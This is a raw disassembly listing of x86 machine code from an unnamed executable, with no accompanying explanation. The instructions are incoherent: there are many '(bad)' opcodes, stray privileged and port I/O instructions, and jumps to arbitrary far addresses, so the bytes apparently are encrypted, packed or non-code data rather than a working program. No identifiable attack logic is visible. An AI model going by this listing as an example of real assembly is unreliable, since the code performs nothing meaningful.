  40b779:	fidivr WORD PTR [esi-0x185e1594]
  40b77f:	push   cs
  40b780:	icebp  
  40b781:	call   0xe7b9:0xac4a33af
  40b788:	popa   
  40b789:	bound  esp,QWORD PTR [edx+0xa]
  40b78c:	shl    BYTE PTR [eax-0x20a35345],1
  40b792:	mov    bl,0x8b
  40b794:	and    eax,0x546b45f5
  40b799:	sub    ebx,edi
  40b79b:	mov    ebx,0x81d41c69
  40b7a0:	rol    BYTE PTR [ecx-0x65],cl
  40b7a3:	jge    0x40b730
  40b7a5:	mov    bl,0x2c
  40b7a7:	push   esp
  40b7a8:	mov    bl,0x32
  40b7aa:	or     BYTE PTR [edi-0x212e9e57],0xeb
  40b7b1:	jmp    0x40b76f
  40b7b3:	ret    
  40b7b4:	xchg   ebx,eax
  40b7b5:	ret    0xb0ae
  40b7b8:	retf   
  40b7b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7ba:	iret   
  40b7bb:	aad    0x5b
  40b7bd:	dec    edx
  40b7be:	push   esp
  40b7bf:	je     0x40b79a
  40b7c1:	push   0xffffffda
  40b7c3:	xor    edi,ebp
  40b7c5:	arpl   WORD PTR [edx+0x593a5554],bx
  40b7cb:	mov    edi,0x199a96c8
  40b7d0:	nop
  40b7d1:	lods   al,BYTE PTR ds:[esi]
  40b7d2:	sub    eax,0x9d2a8d21
  40b7d7:	rcl    bh,0xe
  40b7da:	dec    esi
  40b7db:	cmc    
  40b7dc:	loope  0x40b77b
  40b7de:	jb     0x40b841
  40b7e0:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40b7e2:	in     al,0xab
  40b7e4:	sahf   
  40b7e5:	pop    esi
  40b7e6:	jecxz  0x40b7f0
  40b7e8:	pushf  
  40b7e9:	popf   
  40b7ea:	shl    ebp,0xe7
  40b7ed:	pop    ecx
  40b7ee:	out    0x38,eax
  40b7f0:	(bad)  
  40b7f1:	dec    edi
  40b7f2:	push   esi
  40b7f3:	test   al,0xf8
  40b7f5:	cdq    
  40b7f6:	ret    0x4095
  40b7f9:	or     BYTE PTR [ebp+0x1b],ah
  40b7fc:	std    
  40b7fd:	loop   0x40b7ef
  40b7ff:	sub    cl,al
  40b801:	stos   DWORD PTR es:[edi],eax
  40b802:	jbe    0x40b811
  40b804:	inc    eax
  40b805:	dec    ebp
  40b806:	inc    eax
  40b807:	push   edx
  40b808:	sbb    ah,BYTE PTR [ebp-0x26]
  40b80b:	repz jle 0x40b7d7
  40b80e:	sub    al,0x5a
  40b810:	pop    ebp
  40b811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b812:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b814:	jecxz  0x40b88d
  40b816:	jbe    0x40b856
  40b818:	gs jmp 0x7012:0xa066b25d
  40b820:	mov    esp,0xf1e50a49
  40b825:	and    bh,BYTE PTR [esi-0x17374d02]
  40b82b:	mov    bh,0x73
  40b82d:	mov    ebx,0x6cf051a2
  40b832:	push   ebp
  40b833:	mov    bh,0xcd
  40b835:	int    0x3a
  40b837:	mov    ebp,0xc13a92eb
  40b83c:	jno    0x40b833
  40b83e:	sar    bh,0x7e
  40b841:	pop    esp
  40b842:	loopne 0x40b83e
  40b844:	iret   
  40b845:	out    dx,eax
  40b846:	sub    al,0x1b
  40b848:	icebp  
  40b849:	loop   0x40b846
  40b84b:	mov    ds:0xe88ecd60,eax
  40b850:	add    al,0xde
  40b852:	les    eax,FWORD PTR [esi+0x6a]
  40b855:	int    0x2
  40b857:	sub    ch,al
  40b859:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b85a:	jl     0x40b7e3
  40b85c:	ss pop ecx
  40b85e:	lods   eax,DWORD PTR ds:[esi]
  40b85f:	push   0xffffffd7
  40b861:	es jae 0x40b7ef
  40b864:	xor    BYTE PTR [eax],dl
  40b866:	pop    ss
  40b867:	xchg   esi,eax
  40b868:	jge    0x40b837
  40b86a:	jnp    0x40b8e8
  40b86c:	inc    esi
  40b86d:	mov    ecx,DWORD PTR [ebx-0x71]
  40b870:	xor    dl,al
  40b872:	clc    
  40b873:	sub    DWORD PTR [ecx-0x725c5d33],edx
  40b879:	dec    esp
  40b87a:	cmp    dl,BYTE PTR [edx-0x2efa7923]
  40b880:	lods   eax,DWORD PTR ds:[esi]
  40b881:	mov    ebx,0xc3525656
  40b886:	call   0x6277:0xcff6bdce
  40b88d:	dec    bh
  40b88f:	(bad)  
  40b890:	(bad)  
  40b891:	cmp    BYTE PTR [ecx+0x5],ah
  40b894:	cmp    DWORD PTR [edi+0x37e6b246],edx
  40b89a:	inc    edi
  40b89b:	adc    al,0x2d
  40b89d:	sbb    edx,DWORD PTR [edx]
  40b89f:	jg     0x40b920
  40b8a1:	and    ecx,DWORD PTR [ecx-0x65]
  40b8a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8a5:	xchg   ecx,eax
  40b8a6:	cdq    
  40b8a7:	xchg   esi,eax
  40b8a8:	xchg   BYTE PTR [esi],cl
  40b8aa:	jmp    0x998e41f1
  40b8af:	lea    edx,[edx+0x59]
  40b8b2:	mov    ds,WORD PTR [esi+0x54d7438a]
  40b8b8:	adc    DWORD PTR [ecx-0x6de070c8],ecx
  40b8be:	xor    dh,bl
  40b8c0:	push   edx
  40b8c1:	jecxz  0x40b8c4
  40b8c3:	jp     0x40b871
  40b8c5:	add    ebx,DWORD PTR [esi]
  40b8c7:	out    dx,al
  40b8c8:	pusha  
  40b8c9:	jmp    0xd0a9:0x2a9e3760
  40b8d0:	sbb    BYTE PTR [edx+eiz*2-0x13b417b9],0xd3
  40b8d8:	pop    ebp
  40b8d9:	mov    bl,0x40
  40b8db:	inc    ecx
  40b8dc:	xchg   ebp,eax
  40b8dd:	mov    al,dh
  40b8df:	xor    bh,BYTE PTR [edi]
  40b8e1:	sub    BYTE PTR [ebp-0x5f937012],0xe0
  40b8e8:	jg     0x40b937
  40b8ea:	xor    DWORD PTR [edi+0x6646dacc],ebx
  40b8f0:	mov    cs,ebp
  40b8f2:	mov    WORD PTR [ebx-0x60205218],?
  40b8f8:	lds    esi,FWORD PTR [ebp-0x34]
  40b8fb:	dec    ebx
  40b8fc:	addr16 jb 0x40b8c3
  40b8ff:	pop    ebp
  40b900:	xchg   edi,eax
  40b901:	lahf   
  40b902:	stc    
  40b903:	sbb    eax,0xa862af78
  40b908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b909:	pop    edx
  40b90a:	add    ebx,ebp
  40b90c:	add    eax,0x8aab13ef
  40b911:	test   eax,0x606b6a6e
  40b916:	and    bh,ah
  40b918:	rcl    BYTE PTR [ecx+0x4f],cl
  40b91b:	xchg   ecx,edi
  40b91d:	sbb    bh,BYTE PTR [esp+eax*4]
  40b920:	addr16 add eax,0xe391b794
  40b926:	jbe    0x40b8db
  40b928:	fadd   DWORD PTR [ebp+0x7953bbbf]
  40b92e:	idiv   cl
  40b930:	sbb    DWORD PTR [ebx],eax
  40b932:	(bad)  
  40b933:	mov    ds:0xf34ebc43,al
  40b938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b939:	jnp    0x40b912
  40b93b:	add    BYTE PTR [eax-0x1c],dl
  40b93e:	mov    esp,0x7ed5aeb7
  40b943:	popa   
  40b944:	mov    dl,0x16
  40b946:	out    0x91,al
  40b948:	dec    edx
  40b949:	fs retf 0xf6d1
  40b94d:	xchg   esp,eax
  40b94e:	ret    
  40b94f:	ret    
  40b950:	adc    esi,ecx
  40b952:	adc    esp,ebx
  40b954:	(bad)  
  40b956:	cwde   
  40b957:	push   esp
  40b958:	mov    edi,0xbf6c9cee
  40b95d:	mov    bl,0x1a
  40b95f:	es jne 0x40b93a
  40b962:	pop    ds
  40b963:	gs or  eax,0x813a39bb
  40b969:	icebp  
  40b96a:	fdiv   DWORD PTR [edi+0x3]
  40b96d:	sbb    BYTE PTR [ebx+0x4e],cl
  40b970:	xor    bl,BYTE PTR [edi+0x1de53d6b]
  40b976:	pusha  
  40b977:	inc    ecx
  40b978:	pop    esp
  40b979:	push   cs
  40b97a:	das    
  40b97b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b97c:	or     BYTE PTR [ebx-0x26002c2e],cl
  40b982:	push   ebx
  40b983:	mov    ds:0x67063b8,eax
  40b988:	inc    ecx
  40b989:	push   0xfb518e4f
  40b98e:	clc    
  40b98f:	imul   esp,DWORD PTR [esi-0x1011462c],0x363c1197
  40b999:	mov    dh,0xab
  40b99b:	jle    0x40b98b
  40b99d:	and    BYTE PTR [ebx-0x153c0dd0],bh
  40b9a3:	or     al,0xfe
  40b9a5:	retf   0xf408
  40b9a8:	rcl    BYTE PTR [edi+0x1971fcd3],0xb3
  40b9af:	pop    ebp
  40b9b0:	jns    0x40b94b
  40b9b2:	jo     0x40b973
  40b9b4:	(bad)  
  40b9b6:	pusha  
  40b9b7:	out    0x7c,al
  40b9b9:	cmp    al,0x73
  40b9bb:	sbb    ebx,edx
  40b9bd:	das    
  40b9be:	sub    ebx,DWORD PTR [ecx+0x70]
  40b9c1:	hlt    
  40b9c2:	push   0x95161dec
  40b9c7:	jl     0x40b9d5
  40b9c9:	sub    edx,DWORD PTR [ecx+esi*2-0x2c53f173]
  40b9d0:	dec    esp
  40b9d1:	push   0x58607278
  40b9d6:	ins    BYTE PTR es:[di],dx
  40b9d8:	icebp  
  40b9d9:	jmp    0x7aa89257
  40b9de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9df:	das    
  40b9e0:	adc    ecx,ecx
  40b9e2:	xor    DWORD PTR [edi-0x22],esp
  40b9e5:	ret    0x4aaf
  40b9e8:	or     dl,BYTE PTR [eax*8+0x311c5be4]
  40b9ef:	pop    edx
  40b9f0:	pop    eax
  40b9f1:	xor    DWORD PTR [edi-0x35b64fc5],ebx
  40b9f7:	out    0xf1,al
  40b9f9:	fcmovne st,st(2)
  40b9fb:	pop    edi
  40b9fc:	test   DWORD PTR [ebp+0x66],esp
  40b9ff:	jg     0x40ba69
  40ba01:	mov    dl,0x14
  40ba03:	dec    esi
  40ba04:	sub    al,0x4f
  40ba06:	jl     0x40ba40
  40ba08:	add    eax,0xca89b355
  40ba0d:	cmc    
  40ba0e:	js     0x40b9a5
  40ba10:	sbb    al,0xe3
  40ba12:	jns    0x40ba90
  40ba14:	daa    
  40ba15:	inc    ecx
  40ba16:	push   ss
  40ba17:	js     0x40b9dc
  40ba19:	cmp    eax,edi
  40ba1b:	outs   dx,DWORD PTR ds:[esi]
  40ba1c:	sbb    eax,0x238b8e15
  40ba21:	inc    ecx
  40ba22:	sub    edi,edi
  40ba24:	mov    bh,0x45
  40ba26:	fimul  WORD PTR [ebx]
  40ba28:	fcomp  DWORD PTR [eax]
  40ba2a:	sub    al,0x86
  40ba2c:	mov    bl,0x96
  40ba2e:	data16 sub BYTE PTR [esi],0x74
  40ba32:	bound  ebx,QWORD PTR [eax+0x72]
  40ba35:	mov    esp,0xb915450b
  40ba3a:	mov    eax,DWORD PTR [ecx-0x3d]
  40ba3d:	nop
  40ba3e:	pop    edx
  40ba3f:	cmp    eax,0x17060f58
  40ba44:	gs repnz adc eax,0x37f499fe
  40ba4b:	fisubr WORD PTR [ebx]
  40ba4d:	je     0x40ba33
  40ba4f:	xor    al,0xf0
  40ba51:	ror    BYTE PTR [esi+0x716eb585],1
  40ba57:	pushf  
  40ba58:	sbb    bl,BYTE PTR [esi]
  40ba5a:	pop    esp
  40ba5b:	js     0x40bab4
  40ba5d:	out    0x55,eax
  40ba5f:	mov    ds:0x8bc2889c,eax
  40ba64:	sbb    eax,0xe95f4f4a
  40ba69:	sbb    ebp,DWORD PTR [eax+0x331a9b5a]
  40ba6f:	xor    al,0xf0
  40ba71:	sub    al,0xc8
  40ba73:	xchg   edi,eax
  40ba74:	or     ah,BYTE PTR [ecx-0x10]
  40ba77:	mov    edx,0xcff0da60
  40ba7c:	(bad)  
  40ba7d:	clc    
  40ba7e:	in     al,dx
  40ba7f:	cwde   
  40ba80:	xor    ecx,edi
  40ba82:	(bad)  
  40ba84:	aam    0xb0
  40ba86:	mov    WORD PTR [edi-0x7a],cs
  40ba89:	jmp    0x40ba7f
  40ba8b:	inc    eax
  40ba8c:	aaa    
  40ba8d:	std    
  40ba8e:	sub    esi,DWORD PTR [esi]
  40ba90:	mov    edi,0x92bd6dc4
  40ba95:	int3   
  40ba96:	clc    
  40ba97:	mov    edx,DWORD PTR [edx-0x2]
  40ba9a:	inc    ebp
  40ba9b:	frstor [ecx]
  40ba9d:	inc    esp
  40ba9e:	jp     0x40ba48
  40baa0:	arpl   WORD PTR [esp+eax*1],di
  40baa3:	xchg   esp,eax
  40baa4:	lock adc al,0xa
  40baa7:	sub    DWORD PTR [eax],esi
  40baa9:	into   
  40baaa:	fistp  WORD PTR [esp+ecx*2]
  40baad:	out    0x33,eax
  40baaf:	idiv   edi
  40bab1:	int3   
  40bab2:	and    ecx,edx
  40bab4:	sbb    al,0x88
  40bab6:	mov    ebx,0x8347e9d1
  40babb:	and    edx,0x925013d0
  40bac1:	mov    ds:0x8e401a63,eax
  40bac6:	dec    ecx
  40bac7:	push   ebp
  40bac8:	std    
  40bac9:	push   ebp
  40baca:	dec    eax
  40bacb:	rol    BYTE PTR [ebp-0x582d6eb5],cl
  40bad1:	pop    eax
  40bad2:	ret    0xaba2
  40bad5:	cld    
  40bad6:	pusha  
  40bad7:	mov    bl,BYTE PTR [ebx-0x51]
  40bada:	retf   0x3134
  40badd:	jp     0x40bae8
  40badf:	iret   
  40bae0:	ret    0x837d
  40bae3:	in     eax,0x6
  40bae5:	mov    al,BYTE PTR [edi+0x2d]
  40bae8:	test   al,0xc1
  40baea:	test   DWORD PTR [ecx+0x19a007c9],ebx
  40baf0:	or     DWORD PTR [ebx],ebp
  40baf2:	sub    bh,dl
  40baf4:	idiv   BYTE PTR ds:0x138733b6
  40bafa:	bnd call 0x663deac8
  40bb00:	repnz mov ch,0xf1
  40bb03:	outs   dx,DWORD PTR ds:[esi]
  40bb04:	les    eax,FWORD PTR [eax+0x7f53f7fc]
  40bb0a:	lahf   
  40bb0b:	xlat   BYTE PTR ds:[ebx]
  40bb0c:	dec    eax
  40bb0d:	popa   
  40bb0e:	sbb    al,0xd4
  40bb10:	mov    bl,0xee
  40bb12:	call   WORD PTR [ecx-0x18a8bcf0]
  40bb19:	xchg   esp,eax
  40bb1a:	mov    esp,0x4750dcea
  40bb1f:	cwde   
  40bb20:	cwde   
  40bb21:	das    
  40bb22:	adc    ebp,eax
  40bb24:	mov    BYTE PTR [edi+0x3f],dh
  40bb27:	push   edx
  40bb28:	xor    DWORD PTR ds:0xa6a3241d,eax
  40bb2e:	icebp  
  40bb2f:	outs   dx,DWORD PTR ds:[esi]
  40bb30:	hlt    
  40bb31:	mov    dl,0xc9
  40bb33:	push   es
  40bb34:	sbb    eax,DWORD PTR [ebx]
  40bb36:	mov    ds:0xa801809e,eax
  40bb3b:	(bad)  
  40bb3c:	pushf  
  40bb3d:	push   esp
  40bb3e:	in     eax,0xf
  40bb40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb41:	sahf   
  40bb42:	xchg   BYTE PTR [ebp-0x16],bl
  40bb45:	jns    0x40bbaa
  40bb47:	clc    
  40bb48:	das    
  40bb49:	or     esp,ecx
  40bb4b:	fidiv  WORD PTR [eax-0x46]
  40bb4e:	sub    bh,ah
  40bb50:	pop    esi
  40bb51:	xchg   ebx,eax
  40bb52:	and    edx,edx
  40bb54:	mov    ds:0x9940c43,eax
  40bb59:	or     eax,ecx
  40bb5b:	adc    BYTE PTR [ebx+0x33924f3a],ah
  40bb61:	pushfw 
  40bb63:	and    al,0xbe
  40bb65:	retf   
  40bb66:	or     BYTE PTR [edi+0x5e69a3d],al
  40bb6c:	mov    eax,ds:0xc9cbdc54
  40bb71:	out    0x6e,al
  40bb73:	bound  ebp,QWORD PTR [eax]
  40bb75:	ss inc esp
  40bb77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb79:	std    
  40bb7a:	inc    ecx
  40bb7b:	fiadd  WORD PTR [eax+0x52e74d09]
  40bb81:	ret    0x8459
  40bb84:	jnp    0x40bb4f
  40bb86:	and    edi,DWORD PTR [edx]
  40bb88:	loope  0x40bbb3
  40bb8a:	lds    ebp,FWORD PTR [ecx-0xf3efa5e]
  40bb90:	popf   
  40bb91:	xor    DWORD PTR [edi-0x7b],esi
  40bb94:	bound  ebx,QWORD PTR [ebx-0x10]
  40bb97:	or     cl,dl
  40bb99:	mov    dh,0x2e
  40bb9b:	dec    ebp
  40bb9c:	pop    ecx
  40bb9d:	test   eax,0x5c297695
  40bba2:	push   ecx
  40bba3:	inc    edx
  40bba4:	mov    al,ds:0xe60d46ca
  40bba9:	xchg   edx,eax
  40bbaa:	ds or  eax,0x5f7d0fbc
  40bbb0:	lods   eax,DWORD PTR ds:[esi]
  40bbb1:	(bad)  
  40bbb2:	xor    al,0xb3
  40bbb4:	icebp  
  40bbb5:	lea    ebp,[eax+0x5cc3ba5f]
  40bbbb:	adc    DWORD PTR [eax+0x38168904],esp
  40bbc1:	inc    esi
  40bbc2:	aas    
  40bbc3:	xchg   edi,eax
  40bbc4:	xlat   BYTE PTR ds:[ebx]
  40bbc5:	ret    
  40bbc6:	fcmovne st,st(2)
  40bbc8:	dec    ecx
  40bbc9:	bound  eax,QWORD PTR [edi]
  40bbcb:	mov    BYTE PTR [ebp-0x5061e3ba],cl
  40bbd1:	dec    ebx
  40bbd2:	das    
  40bbd3:	jecxz  0x40bb96
  40bbd5:	pop    ecx
  40bbd6:	jecxz  0x40bb92
  40bbd8:	ret    0x240
  40bbdb:	sub    bh,cl
  40bbdd:	xor    eax,0x60bdac7d
  40bbe2:	pop    esp
  40bbe3:	js     0x40bbb3
  40bbe5:	fstp   QWORD PTR [eax]
  40bbe7:	jae    0x40bb6f
  40bbe9:	add    al,0xd8
  40bbeb:	int    0x11
  40bbed:	or     ebx,DWORD PTR [ecx-0x62]
  40bbf0:	outs   dx,BYTE PTR ds:[esi]
  40bbf1:	push   edi
  40bbf2:	lods   eax,DWORD PTR ds:[esi]
  40bbf3:	jno    0x40bc12
  40bbf5:	jge    0x40bbac
  40bbf7:	out    dx,eax
  40bbf8:	mov    cl,BYTE PTR [edx]
  40bbfa:	pop    eax
  40bbfb:	jle    0x40bbb4
  40bbfd:	mov    ecx,0x4df8a731
  40bc02:	in     al,0x17
  40bc04:	adc    DWORD PTR [edi-0x20],0x69
  40bc08:	out    dx,eax
  40bc09:	push   esp
  40bc0a:	mov    al,0x78
  40bc0c:	(bad)  
  40bc0d:	gs inc eax
  40bc0f:	sub    DWORD PTR ds:[edi-0x6d5ae576],esi
  40bc16:	rcl    DWORD PTR [eax],0x6
  40bc19:	(bad)  
  40bc1a:	pop    ecx
  40bc1b:	add    DWORD PTR [esi-0x5],esp
  40bc1e:	fdiv   QWORD PTR [ebx]
  40bc20:	push   ebx
  40bc21:	adc    al,0xba
  40bc23:	xchg   edi,eax
  40bc24:	push   cs
  40bc25:	or     eax,DWORD PTR [edx]
  40bc27:	cld    
  40bc28:	push   es
  40bc29:	pop    ebp
  40bc2a:	fistp  DWORD PTR [edx]
  40bc2c:	dec    ecx
  40bc2d:	pop    ebp
  40bc2e:	add    DWORD PTR [ebx+0x3ebe3784],ebx
  40bc34:	push   eax
  40bc35:	sub    DWORD PTR [edx+0x71],ebx
  40bc38:	fld    st(3)
  40bc3a:	cld    
  40bc3b:	jle    0x40bbf6
  40bc3d:	push   eax
  40bc3e:	dec    edi
  40bc3f:	mov    edi,0xecc11081
  40bc44:	push   ebx
  40bc45:	or     ecx,eax
  40bc47:	push   ebp
  40bc48:	dec    esp
  40bc49:	inc    edi
  40bc4a:	pushf  
  40bc4b:	bnd jp 0x40bc86
  40bc4e:	pop    ds
  40bc4f:	mov    eax,ds:0x63ddca04
  40bc54:	jl     0x40bc82
  40bc56:	mov    eax,0x5882993d
  40bc5b:	mov    ch,BYTE PTR [edx]
  40bc5d:	cmp    BYTE PTR [edi-0x2c],dh
  40bc60:	cmp    al,0x9f
  40bc62:	jge    0x40bcb0
  40bc64:	dec    esp
  40bc65:	js     0x40bc6a
  40bc67:	rol    DWORD PTR [esi+esi*4-0x1cc95170],0xcd
  40bc6f:	mov    bl,0xab
  40bc71:	and    al,0x98
  40bc73:	pop    ss
  40bc74:	sbb    al,0xdd
  40bc76:	int    0xb3
  40bc78:	pushf  
  40bc79:	repnz dec edx
  40bc7b:	xchg   edx,eax
  40bc7c:	jb     0x40bc4d
  40bc7e:	mov    WORD PTR [edi-0x73],?
  40bc81:	jo     0x40bc2f
  40bc83:	dec    edi
  40bc84:	push   ecx
  40bc85:	lods   al,BYTE PTR ds:[esi]
  40bc86:	nop
  40bc87:	rol    BYTE PTR [ecx+0x460918d],1
  40bc8d:	mov    DWORD PTR ds:0xc70fa816,ebp
  40bc93:	mov    esi,ecx
  40bc95:	xchg   ecx,eax
  40bc96:	cli    
  40bc97:	daa    
  40bc98:	sar    BYTE PTR [ebp-0x4d9f0df3],0xfc
  40bc9f:	ficomp WORD PTR [ebx-0x1e0feb76]
  40bca5:	push   es
  40bca6:	add    DWORD PTR [ebp-0x5898adb5],edi
  40bcac:	push   edx
  40bcad:	retf   0x41cb
  40bcb0:	stc    
  40bcb1:	jb     0x40bd0a
  40bcb3:	ss aam 0x7e
  40bcb6:	push   ecx
  40bcb7:	ds xchg edi,eax
  40bcb9:	(bad)  
  40bcba:	rcl    BYTE PTR [esi],0xf0
  40bcbd:	dec    edx
  40bcbe:	pop    esp
  40bcbf:	sbb    BYTE PTR ds:0x96a75bff,cl
  40bcc5:	sub    eax,0x46d40fb4
  40bcca:	mov    esp,0x8db44122
  40bccf:	ret    
  40bcd0:	push   eax
  40bcd1:	popf   
  40bcd2:	push   ds
  40bcd3:	shl    bh,1
  40bcd5:	push   cs
  40bcd6:	mov    ebx,0x4fcb5f56
  40bcdb:	stos   DWORD PTR es:[edi],eax
  40bcdc:	push   esp
  40bcdd:	push   esp
  40bcde:	pop    ebx
  40bcdf:	adc    DWORD PTR [ebx+edx*2-0x49cf4b70],edi
  40bce6:	cmp    DWORD PTR [esi],0xab9dc01c
  40bcec:	ins    BYTE PTR es:[edi],dx
  40bced:	ret    
  40bcee:	jne    0x40bce1
  40bcf0:	and    eax,edi
  40bcf2:	hlt    
  40bcf3:	dec    ebp
  40bcf4:	lods   eax,DWORD PTR ds:[esi]
  40bcf5:	hlt    
  40bcf6:	imul   eax,ebp,0x2d
  40bcf9:	in     eax,dx
  40bcfa:	aad    0x79
  40bcfc:	inc    eax
  40bcfd:	fcomp  DWORD PTR [eax-0x46]
  40bd00:	jle    0x40bc95
  40bd02:	push   es
  40bd03:	xor    bl,BYTE PTR [edi-0x46095a04]
  40bd09:	adc    DWORD PTR [ecx],0xffffffbe
  40bd0c:	loopne 0x40bd07
  40bd0e:	cld    
  40bd0f:	aas    
  40bd10:	cmp    eax,DWORD PTR [edx+0x21]
  40bd13:	cmp    BYTE PTR [edi-0x67e3c181],ch
  40bd19:	jmp    0xfb0cbfa8
  40bd1e:	imul   esi,ebp,0x40
  40bd21:	jl     0x40bd7e
  40bd23:	mov    cs,WORD PTR [esi]
  40bd25:	pop    ebp
  40bd26:	aaa    
  40bd27:	enter  0x425c,0x58
  40bd2b:	idiv   BYTE PTR [esi-0x4eb897d8]
  40bd31:	ret    0xd11b
  40bd34:	cmp    edx,DWORD PTR [ebx-0x50]
  40bd37:	mov    cl,0x26
  40bd39:	pushf  
  40bd3a:	or     al,0x41
  40bd3c:	inc    edi
  40bd3d:	pop    eax
  40bd3e:	dec    ebx
  40bd3f:	test   DWORD PTR [ebx-0x3a212e98],ecx
  40bd45:	lds    esp,FWORD PTR [esi]
  40bd47:	jmp    0x31c4:0xbe9a2c3a
  40bd4e:	sbb    BYTE PTR [ecx-0x5a],0xee
  40bd52:	cs out dx,al
  40bd54:	mov    al,ds:0x14f94ccc
  40bd59:	push   eax
  40bd5a:	enter  0x83dd,0x46
  40bd5e:	lods   eax,DWORD PTR ds:[esi]
  40bd5f:	mov    edi,0x21a5a277
  40bd64:	pop    edi
  40bd65:	and    al,0x73
  40bd67:	inc    eax
  40bd68:	pop    eax
  40bd69:	mov    ch,0xee
  40bd6b:	xor    cl,BYTE PTR [edi]
  40bd6d:	cli    
  40bd6e:	mov    eax,0x815d29d4
  40bd73:	call   0x27bfbc2d
  40bd78:	dec    ecx
  40bd79:	fisubr WORD PTR [eax-0x3a630a4f]
  40bd7f:	push   0x3e
  40bd81:	dec    esp
  40bd82:	mov    al,0x78
  40bd84:	lods   al,BYTE PTR ds:[esi]
  40bd85:	xor    ch,BYTE PTR [edx-0x4a]
  40bd88:	jmp    0x2b0d64c1
  40bd8d:	gs inc ecx
  40bd8f:	lahf   
  40bd90:	push   esp
  40bd91:	mov    al,0xc9
  40bd93:	or     esi,ecx
  40bd95:	jmp    DWORD PTR [ecx+0x57]
  40bd98:	add    al,0x0
  40bd9a:	or     bl,BYTE PTR [ecx]
  40bd9c:	ds enter 0x56c6,0xe5
  40bda1:	shl    ch,cl
  40bda3:	jmp    DWORD PTR [ebp+0x6b]
  40bda6:	mov    ds,WORD PTR [ebp-0x79]
  40bda9:	push   ecx
  40bdaa:	sbb    ebx,esi
  40bdac:	nop
  40bdad:	out    dx,eax
  40bdae:	push   ds
  40bdaf:	ins    BYTE PTR es:[edi],dx
  40bdb0:	loope  0x40be0c
  40bdb2:	leave  
  40bdb3:	push   ecx
  40bdb4:	les    esi,FWORD PTR [edi+0x59ae14f1]
  40bdba:	and    BYTE PTR [edi+0xb],dh
  40bdbd:	into   
  40bdbe:	(bad)  
  40bdbf:	out    0x6e,al
  40bdc1:	out    dx,al
  40bdc2:	dec    edx
  40bdc3:	push   esi
  40bdc4:	fdivr  QWORD PTR [edi+0x32]
  40bdc7:	lods   al,BYTE PTR ds:[esi]
  40bdc8:	out    0xa7,al
  40bdca:	mov    ds:0x219dda0a,al
  40bdcf:	mov    al,ds:0x6dace104
  40bdd4:	pop    edx
  40bdd5:	(bad)  
  40bdd7:	dec    ebx
  40bdd8:	aam    0xc7
  40bdda:	pop    esp
  40bddb:	push   esi
  40bddc:	lods   eax,DWORD PTR ds:[esi]
  40bddd:	aam    0x35
  40bddf:	lea    eax,[edx+0x29]
  40bde2:	xchg   esi,eax
  40bde3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bde4:	mov    edx,0x26b74df9
  40bde9:	mov    ebx,0x87a335d4
  40bdee:	inc    esp
  40bdef:	(bad)  
  40bdf0:	(bad)  
  40bdf1:	int3   
  40bdf2:	mov    edx,0x2b25938b
  40bdf7:	mov    ds:0xca71afdc,eax
  40bdfc:	or     dl,BYTE PTR [edx+eax*4-0x1f]
  40be00:	xor    ebp,ecx
  40be02:	mov    DWORD PTR [edx],ebx
  40be04:	pop    ebp
  40be05:	retf   0xa51
  40be08:	maskmovq mm7,(bad)
  40be09:	idiv   DWORD PTR [esi+0x7c]
  40be0c:	and    dh,BYTE PTR [ebx+ecx*4+0x35311f4d]
  40be13:	test   eax,0xec60f655
  40be18:	xchg   ebp,eax
  40be19:	mov    edx,0x2a6880c8
  40be1e:	lds    eax,FWORD PTR [esi-0x23b9bed1]
  40be24:	in     eax,dx
  40be25:	lds    esi,FWORD PTR [esi-0x5e]
  40be28:	xchg   ebp,eax
  40be29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be2a:	sub    BYTE PTR [ebx+0x45ce71b1],ch
  40be30:	xor    BYTE PTR [edi+0x57],bl
  40be33:	cwde   
  40be34:	sbb    dh,BYTE PTR [eax+0x6f]
  40be37:	adc    al,bh
  40be39:	fs jp  0x40be57
  40be3c:	or     DWORD PTR es:[edi-0x2538a515],0x42911422
  40be47:	push   eax
  40be48:	shr    DWORD PTR [edi],1
  40be4a:	aam    0xf7
  40be4c:	cli    
  40be4d:	popa   
  40be4e:	xor    dl,BYTE PTR ss:[edi]
  40be51:	ss sub al,0xe1
  40be54:	dec    ebp
  40be55:	mov    ds:0xce911a63,al
  40be5a:	sbb    ah,al
  40be5c:	mov    esp,0x6a64e549
  40be61:	cmc    
  40be62:	xor    ecx,esp
  40be64:	imul   esp,DWORD PTR [ebx+ecx*8-0x2b],0x8f7928cf
  40be6c:	pop    ebp
  40be6d:	fnstcw WORD PTR [ecx]
  40be6f:	adc    al,0x96
  40be71:	mov    ds:0x2fef4e23,eax
  40be76:	jae    0x40be49
  40be78:	mov    eax,ds:0x1ecb621d
  40be7d:	scas   al,BYTE PTR es:[edi]
  40be7e:	fcmovbe st,st(5)
  40be80:	ror    DWORD PTR [eax-0x2c1631f8],0xd
  40be87:	cmp    edx,DWORD PTR [edx]
  40be89:	fcmovnbe st,st(0)
  40be8b:	es pop esi
  40be8d:	rol    BYTE PTR [esi],cl
  40be8f:	aam    0x25
  40be91:	or     ch,BYTE PTR [ebx+ebp*8-0x3e666be0]
  40be98:	push   eax
  40be99:	xchg   edi,eax
  40be9a:	pop    edx
  40be9b:	nop
  40be9c:	mov    BYTE PTR [eax-0xf],bh
  40be9f:	push   ds
  40bea0:	(bad)  
  40bea1:	data16 sbb cl,bh
  40bea4:	fldenv [edx-0x5c]
  40bea7:	jmp    0x3bd8:0x6940d864
  40beae:	rcl    DWORD PTR [esi+0x65],1
  40beb1:	push   edx
  40beb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beb3:	jbe    0x40be36
  40beb5:	xor    BYTE PTR [edx-0x4b369a96],0x28
  40bebc:	(bad)  
  40bebd:	stos   BYTE PTR es:[edi],al
